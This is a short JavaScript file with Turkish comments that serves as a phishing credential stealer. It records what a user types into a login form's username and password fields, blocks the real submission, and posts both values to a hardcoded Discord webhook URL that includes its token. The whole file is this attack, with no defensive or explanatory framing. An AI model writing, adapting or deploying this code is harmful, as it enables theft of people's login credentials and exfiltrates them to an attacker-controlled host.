// Kullanıcı adı ve şifreyi saklamak için değişkenler
var username = "";
var password = "";

// Kullanıcı adı ve şifre alanlarını doldurduğunda bilgileri saklama
document.getElementById('username').addEventListener('input', function(event) {
    username = event.target.value;
});

document.getElementById('password').addEventListener('input', function(event) {
    password = event.target.value;
});

// Form gönderildiğinde Discord webhookuna bilgileri gönderme
document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault(); // Formun normal submit işlemini engelleme

    // Discord webhook URL'sini buraya.
    var webhookURL = 'https://discord.com/api/webhooks/1217512513718194217/TVOylti1UkD62-JED7sTa9qQiv_L3d4hlM1Z719MJ4syUQTL-P8lrcSJwdPHEIBpynCu';

    var data = {
        content: 'Kullanıcı adı: ' + username + '\nŞifre: ' + password
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => console.log('Discord webhookuna gönderildi:', response))
    .catch(error => console.error('Discord webhookuna gönderilemedi:', error));
});
